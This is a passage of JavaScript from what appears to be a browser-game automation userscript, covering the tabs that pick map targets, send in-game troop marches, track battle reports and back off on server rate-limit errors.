					verboseLog('<b>Attack</b> to ' + target_msg + ' failed - <b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
				
					t.dispFeedback(translate('Attack to') + ' ' + target_msg + ' ' + translate('failed')+' - ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
				}
				if (r.status && r.status === 429){
					/*
					if ( Data.options.marches.requests.counter > 30 ) {
						Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
					}
					*/
					delay = ERROR_429_DELAY;
					verboseLog('<b>Attack</b> to ' + target_msg + ' failed - <b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
				
					t.dispFeedback(translate('Attack to') + ' ' + target_msg + ' ' + translate('failed')+' - API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
				}
				
				t.timer.attack = setTimeout(t.attackTick, delay);

				// Erase feedback message
				setTimeout( function(){ t.dispFeedback(''); }, parseInt( delay/2 ) );
			},
			
			caller  : 'Tabs.Waves.attackTick'
		});
	},

	marchesTick : function (){
		var t = Tabs.Waves;
		clearTimeout ( t.timer.marches ); t.timer.marches=null;
		Marches.updateTable ( $id(UID['Tabs.Waves.marches']), 'waves' );
		t.timer.marches = setTimeout (t.marchesTick, 1000);
	},
	
	onChangeCoords : function (event){
		var ex = $id(UID['Tabs.Waves.tabTargets.coord_x']);
		var ey = $id(UID['Tabs.Waves.tabTargets.coord_y']);
		var x = parseIntZero (ex.value);
		var y = parseIntZero (ey.value);
		ex.value = x;
		ey.value = y;
		
		$J('#'+UID['Tabs.Waves.tabTargets.distance']).html( Map.getDistance(Data.options.map.x, Data.options.map.y, x, y) );
		
		var time = Marches.getMarchTime (x,y, Data.options.waves.wave[0].units);
		$J('#'+UID['Tabs.Waves.tabTargets.time']).html( timeFormatShort(time) );
				
		$J('#'+UID['Tabs.Waves.tabTargets.target']).html('&nbsp;');
		
		if (x < 0 || x > 749){
			if(x < 0){
				while (x < 0){
					x = 750 + x;
				}
			} else {
				while (x > 749){
					x = x - 750;
				}
			}
			ex.style.backgroundColor = '#faa';
			return;
		}
		if (y < 0 || y > 749){
			if(y < 0){
				while (y < 0){
					y = 750 + y;
				}
			} else {
				while (y > 749){
					y = y - 750;
				}
			}
			ey.style.backgroundColor = '#faa';
			return;
		}
		
		Data.options.waves.target.x = x;
		Data.options.waves.target.y = y;
		
		ey.style.backgroundColor = '';
		ex.style.backgroundColor = '';
		Map.tileAt({
			x         : x,
			y         : y,
			onSuccess : function( target ){
				if ( target ){
					var type = target.city_type ? Map.names.cities[ target.city_type ] : Map.names.type[ target.type ];
					Data.options.waves.target.type = type;
					Data.options.waves.target.level = target.level;
					
					var attColor = target.attackable ? '#000' : '#C22';
					
					var html = 
					 '<font color=' + attColor + '>'
					+'	<b>' + translate(type) + '&nbsp;' + translate('Level') + '&nbsp;' + target.level + '</b>'
					+'</font>';
					if ( target.city_name ) {
						html +=
						  '<br>' + translate('City') + ': <b>' + target.city_name + '</b> - '
						+ translate('Alliance') + ': <b>' + (target.alliance ? target.alliance : '----') + '</b>'
						+ '<br>' + translate('Name') + ': <b>' + target.player_name  + '</b> - '
						+ translate('Level') + ': <b>' + target.player_level + '</b> - '
						+ translate('Power') + ': <b>' + target.might + '</b>';
					}
					
					$id(UID['Tabs.Waves.tabTargets.target']).innerHTML = html;
				}
			},
			onFailure : function ( r ) {
			},
			caller  : 'Tabs.Waves.onChangeCoords'
		});
	},


}; // END Tabs.Waves



//******************************** Attacks Tab *****************************
// References to camp and camps changed to mapObject to make sure that other data does not overwrite the camps
Tabs.Attacks = {
	tab_order		: ATTACK_TAB_ORDER,
	tab_label		: 'Attacks',
	tab_disabled	: !ATTACK_TAB_ENABLE,
	
	last_tab_id		: 'tabLevels',
	
	container		: null,
		
	units_type 		: Units.attacks_units_type,

	timer			: {
		 attack			:null
		,marches		:null
		,targets		:null
	},
	
	running			: {
		 start_at		: 0
		,attacks		: 1
		,errors			: 0
	},
	
	target_category : 1,
	last_attack		: 0,
	
	check_map_busy	: false,
	
	//filter_targets	: '',
	
	targets : [],
	max_targets_per_page : 1000,
	targets_page_number : 1,
	targets_max_page : 1,
	targets_sort_by : '',
	
	init : function (div)
	{
		var t = Tabs.Attacks;
		t.container = div;
		
		// This is where we store the units type and quantity from the Levels sub-tab
		// TBD: To save different configurations for wildernesses, ant camps, and cities/outposts
		// I will use a multidimensional array. The first index is the row, the second is the column
		// For our purposes the row is the map type selector, and the column is the unit type and quantity data {}
		//
		// [wilderness][0(null)][1][2][3][4][5][6][7][8][9][10][11]
		// [antcamps][0(null)][1][2][3][4][5][6][7][8][9][10][11]
		// [city][0(null)][1][2][3][4][5][6][7][8][9][10][11]
		//
		for ( var x=1; x < 12; x++ )
		{
			if ( !Data.options.attacks.units[x] )
			{
				Data.options.attacks.units[x] = {};
			}
			for (var unit_type in Data.options.attacks.units[x]) 
			{
				var num = Data.options.attacks.units[x][unit_type];	
				if (num > 0 && !Dragons.DRAGONS_REGEXP.test( unit_type ) && Units.getUnitNumbers(0, unit_type).total == 0) {
					Data.options.attacks.units[x][unit_type] = 0;
				}
			}
		}
		
		var html = 
		 '<div id=' + setUID('Tabs.Attacks.title') + ' class=' + UID['title'] + '>' + translate('Attack') + ' ' + translate(Data.options.map.selected) + ' </div>'
		+'<div class=' + UID['status_ticker'] + ' id='+ setUID('Tabs.Attacks.status') + ' style="margin-bottom:5px !important">'
		+'	<center>'
		+'		<input type=button value="OnOff" id=' + setUID('Tabs.Attacks.enabled') + ' />'
		+'	</center>'
		+'	<div class=' + UID['status_report'] + ' style="height:140px; max-height:140px;">'
		+'		<table id=' + setUID('Tabs.Attacks.marches') + ' class="' + UID['table'] + ' zebra"  style="width:474px;max-width:474px;">'
		+'		</table>'
		+'	</div>'
		+'	<div id=' + setUID('Tabs.Attacks.feedback') + ' class=' + UID['status_feedback'] + '></div>'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Attacks.tabLevels')  + '>' + translate('Levels')     + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Attacks.tabTargets') + '>' + translate('Targets')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Attacks.tabStats')   + '>' + translate('Statistics') + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Attacks.tabMaps')    + '>' + translate('Map')        + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Attacks.tabOptions') + '>' + translate('Options')    + '</a></li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Attacks.content') + ' style="padding-top:1px; height:460px;"></div>';
		
		$J( t.container ).html( html );
		

		// Add the event listeners
		$J('#'+UID['Tabs.Attacks.enabled']).click (function (){
			t.setAttackEnable ( !Data.options.attacks.enabled );
		});
		
		$J( '#'+UID['Tabs.Attacks.tabLevels']  ).click ( {current_tab:0}, t.showSubTab );
		$J( '#'+UID['Tabs.Attacks.tabTargets'] ).click ( {current_tab:1}, t.showSubTab );
		$J( '#'+UID['Tabs.Attacks.tabStats']   ).click ( {current_tab:2}, t.showSubTab );
		$J( '#'+UID['Tabs.Attacks.tabMaps']    ).click ( {current_tab:3}, t.showSubTab );
		$J( '#'+UID['Tabs.Attacks.tabOptions'] ).click ( {current_tab:4}, t.showSubTab );
		
		if ( !Data.options.marches.maximum || 
			 Data.options.marches.maximum === 0 || 
			 Data.options.marches.maximum > Seed.cities[0].figures.marches.maximum
			) {
			Data.options.marches.maximum = Seed.cities[0].figures.marches.maximum;
		}
		
		if ( !Data.stats.attacks.start_at ) {
			Data.stats.attacks.start_at = serverTime();
		}
		
		Messages.addBattleReportListener(t.gotBattleReport);
		
		setTimeout (Marches.check, 30000);
		
		setTimeout (t.marchesTick, 1000);  // modify by Didi
		
		t.tabLevels();
		
		window.addEventListener ( 'unload', t.onUnload, false );
		
		t.setAttackEnable ( Data.options.attacks.enabled );
				
	},

	show : function ()
	{
		var t = Tabs.Attacks;

		t.showSubTab ( {data:{ current_tab: Data.options.attacks.current_tab }} );
	},
	
	hide : function ()
	{
		var t = Tabs.Attacks;
		//clearTimeout (t.timer.marches); t.timer.marches=null;
		if ( t.map_viewer ){
			t.map_viewer.close();
		}
		t.clearTimerTicks();
	},

	onUnload : function ()
	{
		var t = Tabs.Attacks;
		if ( Data.options.attacks.enabled )
		{
			Data.stats.attacks.run_time += ( serverTime() - t.running.start_at );
		}
	},
	
	showSubTab : function(event)
	{
		var t = Tabs.Attacks;
		
		var current_tab = event.data.current_tab;
		
		Data.options.attacks.current_tab = current_tab;

		t.clearTimerTicks();
		
		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name='tabLevels'  ; break;
		case 1: tab_name='tabTargets' ; break;
		case 2: tab_name='tabStats'   ; break;
		case 3: tab_name='tabMaps'    ; break;
		case 4: tab_name='tabOptions' ; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Attacks.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Attacks.' + tab_name;
		
		if ( current_tab !== 3 && t.map_viewer ) {
			t.map_viewer.close();
		}
		
		t[tab_name] ();
	},
	
	clearTimerTicks : function()
	{
		var t = Tabs.Attacks;
		// clear all Timer Ticks
		clearTimeout ( t.timer.targets ); t.timer.targets=null;

	},
	
	gotBattleReport : function ( r )
	{
		var t = Tabs.Attacks;
		var is_target = false;
		
		//debugLog ('Tabs.Attacks.gotBattleReport'); 
		//for (var i=0; i < t.targets.length; i++)
		//{
		//	if ( t.targets[i].x === r.report.location.x &&
		//	     t.targets[i].y === r.report.location.y ) {
		//		is_target = true;
		//		break;
		//	}
		//}
		
		//Check if in Data.marches.attacks
		for (var id in Data.marches.attacks )
		{
			var march = Data.marches.attacks[id];
				
			if (march.x === r.report.location.x && 
				march.y === r.report.location.y 
				){  
					is_target = true;
					break;
			}
		}
		
		if ( !is_target ) {
			logit('not target battle report =\n'+inspect(r.report,8,1));
							//logit('Message '+r.report_notification.id+' is not for an attacks target');
		}
		
		if ( is_target )
		{
			var march_id = null;
			for (var id in Data.marches.attacks )
			{
				var march = Data.marches.attacks[id];
				
				if (march.x === r.report.location.x && 
					march.y === r.report.location.y &&
					march.general && march.general.id === r.report.attacker.general.id
					){  // TODO: time and units check here
						march_id = id;
						break;
				}
			}
	
			if (march_id) {
				Data.marches.attacks[march_id].has_report = true;
				var resources =  r.report.spoils.resources;
				Data.marches.attacks[march_id].res = resources;
				t.trackStats (march_id, r);
			}
			
			//Didi modif : additems
			var kill_items =  r.report.spoils.kill_items;
			Items.add(kill_items);

			var items_res = r.report.spoils.items;
			var add_items = {};
			for (var i=0; i < items_res.length; i++)
			{
				var item = items_res[i];
				if ( /(Stack|TroopPrizeItem)/.test(item) ) {
					var quantity = item.replace(/\D/g,'');
					quantity = parseInt( quantity );
					quantity = (isNaN(quantity)) ? 1 : quantity;
					var name = item.replace(/\d/g,'').replace('Stack','').replace('TroopPrizeItem','');
				} else {
					var quantity = parseInt( item );
					quantity = (isNaN(quantity)) ? 1 : quantity;
					var name = item;
				}
			
				if ( /(AquaTroopRespirator|StoneTroopItem|FireTroopItem|WindTroopItem|IceTroopItem|SwampTroopItem|FrostGiantItem|ForestTroopItem|DarkSlayerItem|Curse|DragonEgg)/.test(name) ) {
					add_items[name] = quantity;
				} 
				else if ( /(Helmet|Head|ClawGuards|Talons|BodyArmor|Body|TailGuard|Tail|GreenArmor|RedArmor|GoldArmor|BlackArmor|PinkArmor|BlueArmor|SilverArmor)/.test(name) ) {
					add_items[name] = quantity;
				}
			}
			Items.add(add_items);
			
			if ( !Data.options.attacks.delete_reports && !Data.options.attacks.stop_on_loss ){
				return;
			}
			
			if (march_id) {   
				var march = Data.marches.attacks[march_id];
				if ( Data.options.attacks.stop_on_loss && march && march.origin && march.origin == 'tools')
				{
					for (var p in r.report.attacker.units)
					{
						if( !Dragons.DRAGONS_REGEXP.test( p ) ) { // Didi : don't test dragon 
	    	
							if ( r.report.attacker.units[p][0] !== r.report.attacker.units[p][1] )
							{
								var ts = new Date(r.report_notification.created_at * 1000).myString();
								t.abort (translate('Troops lost') +'! ('+ ts +')');
								return;
							}
						}
					}
				}
				if (Data.options.attacks.delete_reports && r.report.attacker.name === Seed.player.name && march_id){
					if (march && march.origin && march.origin == 'tools') {
						Messages.deleteMessage (r.report_notification.id);
					}
				}
			}
		}
	},

	setAttackEnable : function ( on_off )
	{
		var t = Tabs.Attacks;
		clearTimeout (t.timer.attack); t.timer.attack=null;
		
		var but = $id(UID['Tabs.Attacks.enabled']);
		Data.options.attacks.enabled = on_off;
		
		if ( on_off ) {
		
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
		
			but.value = translate('Attacking').toUpperCase();
			but.className = UID['btn_on'];
			
			t.running.start_at = serverTime();
			t.running.attacks = 1;
			
			// Yes, check here if waves are enabled
			if ( !Data.options.waves.enabled ){
				Data.options.marches.requests.counter = 1;
				Data.options.marches.requests.start_at = serverTime();
			}
			
			t.autoCheckTargets();
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
			t.dispFeedback ('');
			
			if ( t.running.start_at !== 0 ) {
				Data.stats.attacks.run_time += ( serverTime() - t.running.start_at );
			}
		}
	},

	abort : function ( msg )
	{
		var t = Tabs.Attacks;
		t.setAttackEnable ( false );
		t.dispFeedback ( msg );
		actionLog ( msg );
	},

	marchesTick : function ()
	{
		var t = Tabs.Attacks;
		clearTimeout ( t.timer.marches ); t.timer.marches=null;
		Marches.updateTable( $id(UID['Tabs.Attacks.marches']), 'attacks' );
		t.timer.marches = setTimeout ( t.marchesTick, 1000 );
	},

	dispFeedback : function (msg)
	{
		if ( msg && msg !== '' ){
			msg = new Date().toTimeString().substring (0,8) + '&nbsp;' + msg;
		}
		$J('#'+UID['Tabs.Attacks.feedback']).html ( msg );
	},

	autoCheckTargets : function ()
	{
		var t = Tabs.Attacks;
		var now = serverTime();
		var city_idx = 0;
		var target_msg='', retry_delay, available_general, marching = 0, total_marches=0, id;
		
		clearTimeout ( t.timer.attack ); t.timer.attack=null;
		
		// Don't do anything if attacks are not enabled
		if ( !Data.options.attacks.enabled ){
			return;
		}
		
		
		var min_time = 700000;
		var max_time = 0;
		for (id in Seed.marches)
		{
			++total_marches;
			if (Seed.marches[id].status === 'marching'){
				++marching;
			}
			
			// Fixed by Jawz74
			var left_time = ( Seed.marches[id].run_at - parseInt(serverTime()) ) + (Seed.marches[id].status=='marching' ? Seed.marches[id].duration : 0);

			//fixed by Didi
			if (left_time > 0) {
				min_time = min_time < left_time ? min_time : left_time;
				max_time = max_time > left_time ? max_time : left_time;
			}
		}
		
		//fixed by Didi
		if ( min_time === 700000 || max_time === 0 ) {
			min_time = 3;
		}
		
		retry_delay = (min_time * 1000) + 10000 + Math.randRange(2000,5000);

		if ( Marches.total.attacks >= Data.options.marches.maximum )
		{
			verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to <b>march limit</b> reached: retry in ' + timeFormat(retry_delay/1000));

			t.dispFeedback(translate('March limit reached') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
			return;
		}
		
		if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 )
		{
			verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to </b>insufficent march</b> slots: retry in ' + timeFormat(retry_delay/1000));

			t.dispFeedback (translate('Muster Point') +' '+ translate('Full') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
			return;
		}

		// Get the next target, make sure we have sufficient units
		t.getNextAttackTarget ({
			onSuccess : function ( target )
			{
				if ( !target.attackable ) {
					// Didi modif : get next target
					var next_target_delay = (3 * 1000) + 10000 + Math.randRange(2000,5000);
					t.dispFeedback (translate('Finding ') +' '+ translate('attackable') + ' '+ translate('target')+ ' ... ' + translate('Retry in') + ' ' + timeFormat(next_target_delay/1000));
					t.timer.attack = setTimeout(t.autoCheckTargets, next_target_delay);
					return;
				}
			
				available_general = getAvailableGeneral( target.level === 1 );

				if ( available_general === null )
				{
					verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to <b>insufficent generals</b>: retry in ' + timeFormat(retry_delay/1000));

					t.dispFeedback(translate('Generals') + ' ' + translate('Unavailable') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
					t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
					return;
				}
			
				// Check & Set Available Dragon
				var dragon_name = Dragons.getAvailableDragon(target.level);
				if (dragon_name !== '-1')
				{
				  if ( dragon_name === null) {
						verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to <b>not available dragon</b>: retry in ' + timeFormat(retry_delay/1000));
						t.dispFeedback( translate('Dragon') + ' ' + translate('Unavailable') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
						t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
						return;
					} 
				}
				
				if ( Units.checkAvailableUnits (0, Data.options.attacks.units[target.level] ) === null )
				{
					target_msg = target.x + '/' + target.y;
					
					t.sendAttack ({
						city_idx  : 0,
						target    : target,
						general   : available_general,
						dragon    : dragon_name,
						
						onSuccess : function ( r ){
							var t = Tabs.Attacks, delay;
						
							t.running.errors=0;
							
							var delay_min = Data.options.attacks.delay_min;
							var delay_max = Data.options.attacks.delay_max;
							delay = Math.randRange(delay_min*1000, delay_max*1000);

							if ( Data.options.marches.requests.counter >= Data.options.marches.requests.max_per_hour )
							{
								if ( parseInt(serverTime() - Data.options.marches.requests.start_at) < 3600 )
								{
									delay = parseInt( (3600 - (serverTime() - Data.options.marches.requests.start_at)) * 1000);
									setTimeout(function(){t.dispFeedback(translate('Attacks stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, delay_min*500 );
								}
								else {
									Data.options.marches.requests.start_at = serverTime();
									Data.options.marches.requests.counter = 1;
								}
							}
							else if ((Data.options.marches.requests.counter % 15) === 0)
							{
								var time_offset = parseInt(serverTime() - Data.options.marches.requests.start_at);
								if ( time_offset < 3600 )
								{
									if ( (time_offset / Data.options.marches.requests.counter) < (3600 / Data.options.marches.requests.max_per_hour) )
									{
										/* Attacks are being sent at a rate that will exceed the maximum per hour slow down. */
										delay = 45 * total_marches * 1000;
										setTimeout(function(){t.dispFeedback(translate('Attacks stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, delay_min*500 );
									}
								}
							}
							else {
								delay = Math.randRange(delay_min*1000, delay_max*1000);
								setTimeout(function(){t.dispFeedback('')}, parseInt(delay/2) );
							}
							
							t.timer.attack = setTimeout(t.autoCheckTargets, delay);
							
						},
						
						onFailure : function ( r ){
							var t = Tabs.Attacks, normal_delay, delay;
							
							t.running.errors++;
							
							var delay_min = Data.options.attacks.delay_min;
							var delay_max = Data.options.attacks.delay_max;
							normal_delay = Math.randRange(delay_min*1000, delay_max*1000);

							delay = 30000 * (t.running.errors > 0 ? t.running.errors * t.running.errors : 1);
							
							//didi : change delay when failure because when error it's because troop or dragon is unvailable
							if (delay < retry_delay) 
							{
								delay = retry_delay;
							}
							
							if (delay < normal_delay) 
							{
								delay = normal_delay;
							}

							if ( r.status ) {
								if ( r.status === 509 )
								{
									delay = ERROR_509_DELAY;
									verboseLog('<b>Attack</b> to ' + target_msg + ' failed - <b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
							
									t.dispFeedback(translate('Attack to') + ' ' + target_msg + ' ' + translate('failed')+' - ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
								}
								if ( r.status === 429 )
								{
									delay = ERROR_429_DELAY;
									verboseLog('<b>Attack</b> to ' + target_msg + ' failed - <b>' + 'API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat(delay/1000));
							
									t.dispFeedback(translate('Attack to') + ' ' + target_msg + ' ' + translate('failed')+' - API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') +' '+ timeFormat(delay/1000));
								}
							}
							else if ( r.errmsg ) {
								verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to </b>' + r.errmsg + '</b>: retry in ' + timeFormat(delay/1000));

								t.dispFeedback ( r.errmsg + ': ' + translate('Retry in') + ' ' + timeFormat(delay/1000) );
							}
							
							t.timer.attack = setTimeout(t.autoCheckTargets, delay);
						}
					}); // End sendAttack
					return;                
				}
				else {
					verboseLog('<b>Attack</b> to ' + target_msg + ' delayed due to <b>insufficient troops</b>: retry in ' + timeFormat(retry_delay/1000));

					t.dispFeedback(translate('Not enough') + ' ' + translate('Troops') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
					t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
				}
			
			},
			
			onFailure : function ( error_msg ) {
				verboseLog('<b>Attack</b> to ' + target_msg + '<b>Requirements Unmet</b>: ' + error_msg +' ... Retry in' + timeFormat(retry_delay/1000));

				t.dispFeedback(translate('Requirements Unmet') + ': ' +error_msg + ' ... '+ translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
				t.timer.attack = setTimeout(t.autoCheckTargets, retry_delay);
			}
		});
	},

	// notifies with true for success, false if error
	/*
		options
		{
			city_idx:
			target:
			general:
			onSuccess:
			onFailure:
		}
	*/
	sendAttack : function ( options )
	{
		var t = Tabs.Attacks;
		var now = serverTime();
		
		/*
		if ( t.attack_busy ){
			t.dispFeedback (translate('Error')+ ': ' +translate('sendAttack is busy, no response from server?'));
			return;
		}
		*/
		
		var city_idx = options.city_idx;
		var target   = options.target;
		var general  = options.general;
		
		
		var attack_msg =  translate('Attack sent to') + ': ' + translate(Data.options.map.selected) + ' ' + translate('Level') + ' ' + target.level + ' ' + translate('at') + ' ' + target.x + '/'+ target.y;
		
		var attack_msg_log =  'Attack sent to: ' + Data.options.map.selected + ' Level ' + target.level + ' at ' + target.x + '/'+ target.y;
		

		// Clone the units to include the dragon available
		var units = Data.options.attacks.units[target.level].cloneProps(); 
				
		// If there is some dragon selected, but none are available to send, cancel the request
		if ( !Dragons.chooseOneDragon(units) )
		{
			if ( options.onFailure )
			{
				// We return the notice to the function sendAttack to delay the next attempt
				options.onFailure ( { errmsg: translate('Dragon') + ' ' + translate('Selected') + ' '+ translate('Unavailable') } );
			}
			return;
		}
		
		verboseLog ( attack_msg_log +' Attempted' );
		//debugLog('units :\n'+inspect(units,4,1));
		
		//t.attack_busy = true;
		t.last_attack = now;
		
		new MyAjax.marches ({
			city_id    : Seed.cities[city_idx].id,
			x          : target.x,
			y          : target.y,
			general_id : general.id,
			units      : units,
			owner_id   : 'attacks',
			delay      : 3000,
			
			onSuccess  : function ( r ) {
			
				//t.attack_busy = false;

				Marches.add(r.job.march_id, 'attacks');
				
				Data.options.marches.requests.counter++;
				
				var xy = target.x + ',' + target.y;
				if ( !Map.states[ xy ] ) {
					Map.states[ xy ] = {};
				}
				Map.states[ xy ].last_attack = now;
				
				t.running.errors = 0;
				
				verboseLog(attack_msg_log +' Successfully');
				
				t.dispFeedback(attack_msg);
				
				if ( Data.options.attacks.log_attacks ) {
					actionLog(attack_msg);
				}

				if ( options.onSuccess ) 
				{
					options.onSuccess ( r );
				}
			},
			
			onFailure  : function ( r ) {
			
				if (r.status && r.status === 509)
				{
				/*
					if ( Data.options.marches.requests.counter > 30 ) {
						Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
					}
				*/
				}

				++t.running.errors;

				verboseLog(attack_msg_log + ' <b>failed and returned error</b>: ' + r.errmsg);
					
				actionLog(attack_msg + ' ' + translate('failed'));
					
				t.dispFeedback(attack_msg + ' failed');
					
				if ( options.onFailure ) 
				{
					options.onFailure ( r );
				}
			},
			
			caller   : 'Tabs.Attacks.sendAttack'
		});
	},

	/* New getNextAttackTarget enhanced by Lord Mimir [2011-11-04]
	*  Return the next target that is next to be attacked, 
	*  if we are at the last object in the last, return the first object
	*/
	getNextAttackTarget : function ( options )
	{
		var t = Tabs.Attacks;
		
		var last_attack = 0;
		var next_target = null;
		var target = null;
		var msg = '';
		var now = serverTime();		
		
		var map_type = options.map_type || Data.options.map.selected;
		//Clone the level_enable so does not effect original values
		var level_enable =  Data.options.attacks.level_enable.cloneProps(); 
		for (var i=0; i < level_enable.length; i++)
		{
			if(  level_enable[i]  && Units.checkAvailableUnits (0, Data.options.attacks.units[i] ) !== null )
			{
				level_enable[i]=false;
				msg = Units.checkAvailableUnits (0,  Data.options.attacks.units[i] );
			}
		}

		if ( Data.options.attacks.randomise_attacks == true ){
			// Look through all the targets in randomise
			for (var i=0; i < t.targets.length; i++)
			{
				var target = t.targets[Math.floor((Math.random()*(t.targets.length-i)))];
				// Skip a target if the units set for that level are not available ( by Lord Mimir )
				if ( !level_enable[ target.level ] ){
					continue;
				}
			
				Map.CheckOurselves(target);

				var target_states = Map.states[ target.x + ',' + target.y ];
				// Is this target attackable?
				if ( target_states && target_states.attackable )
				{
					// Has the target never been attacked?
					if ( !target_states.last_attack || target_states.last_attack === 0
	                     || target_states.last_attack < now - 3600 ) 
					{
						next_target = target;
						break;
					}
				}
			}
		} else {
			// Look through all the targets
			for (var i=0; i < t.targets.length; i++)
			{
				var target = t.targets[i];
				
				// Skip a target if the units set for that level are not available ( by Lord Mimir )
				if ( !level_enable[ target.level ] ){
					continue;
				}
				
				Map.CheckOurselves(target);
				
				var target_states = Map.states[ target.x + ',' + target.y ];
				
				// Is this target attackable?
				if ( target_states && target_states.attackable )
				{
    	
					// Has the target never been attacked?
					if ( !target_states.last_attack || target_states.last_attack === 0 ) 
					{
						next_target = target;
						break;
					}
					
					else if ( last_attack === 0 )
					{
						// Yes, this target is next (so far)
						last_attack = target_states.last_attack;
						next_target = target;
					}
					
					// Was the previous target attacked before this target?
					else if (last_attack > target_states.last_attack) 
					{
						// Yes, this target is next (so far)
						last_attack = target_states.last_attack;
						next_target = target;
						break;
					}
				}
			}
		}

		// No target reaches the specified requirements
		if ( next_target === null )	{
			if (msg === '') msg = translate('No target available');
			options.onFailure ( msg );
			return;
		}

		// Return the next target
		Map.tileAt ({
			x         : next_target.x,
			y         : next_target.y,
			onSuccess : function( target ) {
				options.onSuccess ( target );
			},
			onFailure : function( ) {
				options.onFailure ( null );
			},
			caller    : 'Tabs.Attacks.getNextAttackTarget'
		});
		//return next_target;
	},

	// return array of targets that satisfy config (max distance, level enables)
	getActiveObjectList : function ( map_type, level_enable )
	{
		var t = Tabs.Attacks;
		
		level_enable= (level_enable !== undefined) ? level_enable : Data.options.attacks.level_enable;
		map_type = ( map_type !== undefined ? map_type : Data.options.map.selected );
		
		var filter_targets = Data.options.attacks.filter_targets.strip();
		var do_filter = ( /(City|Outpost|Wildernesses)/.test( map_type ) && filter_targets.length > 0 );
		var filter_pattern = new RegExp( RegExp.escape( filter_targets ), 'i' );
		
		var radius = 0;
		for ( var i = 0; i < Data.options.attacks.level_dist.length; i++ )
		{
			if ( Data.options.attacks.level_dist[ i ] > radius ) {
				radius = Data.options.attacks.level_dist[ i ];
			}
		}
		
		var terrains = Map.getTargets( { radius: radius } );
		
		var targets = [];
		
		
		if ( terrains[map_type] )
		{
			for (var i=0; i < terrains[map_type].length; i++)
			{
				var target = ( terrains[map_type] )[i];

				// Very complex conditional syntax ;)
				if ( /* check if target terrain exist in the map */
					 target 
					 && 
					 /* check if the target level is the right */
					 level_enable[target.level]
					 &&
					 /* check if the target distance is the right */
					 (
					  Data.options.attacks.level_dist[ target.level ] === 0 || 
					  Data.options.attacks.level_dist[ target.level ] >= Map.getDistance( Map.x, Map.y, target.x, target.y )
					 )
					 &&
					 /* check if we need to filter it */
					 (
					   /* no filter */
					   !do_filter
					   ||
					   /* filter */
					   ( do_filter
					     && 
					     (
					       /* check if the target have a City Name and verifies its filtering */
					       ( target.city_name && filter_pattern.test( target.city_name ) )
						   ||
						   /* check if the target have a Player Name and verifies its filtering */
						   ( target.player_name && filter_pattern.test( target.player_name ) )
						   ||
						   /* check if the target have a Alliance Name and verifies its filtering */
						   ( target.alliance && filter_pattern.test( target.alliance ) )
					     )
					   )
					 )
				  ){
						targets.push (target);
				}
			}
		}
	
		// Sort targets list by distance
		targets.sort( t.targetsSort );
		
		t.targets = targets;
		
		return targets;
	},

	targetsSort : function ( a, b )
	{
		var result = 0;
		var t = Tabs.Attacks;

		if ( t.targets_sort_by === '' ) {
			if ( Data.options.attacks.order_by_time ) {
				t.targets_sort_by = 'March time';
			} else {
				t.targets_sort_by = 'Distance';
			}
		} else {
			if ( !Data.options.attacks.order_by_time && t.targets_sort_by === 'March time' ) {
				t.targets_sort_by = 'Distance';
			}
			if ( Data.options.attacks.order_by_time && t.targets_sort_by === 'Distance' ) {
				t.targets_sort_by = 'March time';
			}
		}
		
		switch ( t.targets_sort_by ){
			default:
			case 'Distance' : 
				result = a.dist - b.dist;
				break;
			case 'Level' :
				result = a.level - b.level;
				if ( result == 0 )
				{
					result = a.dist - b.dist;
				}
				break;
			case 'March time' :
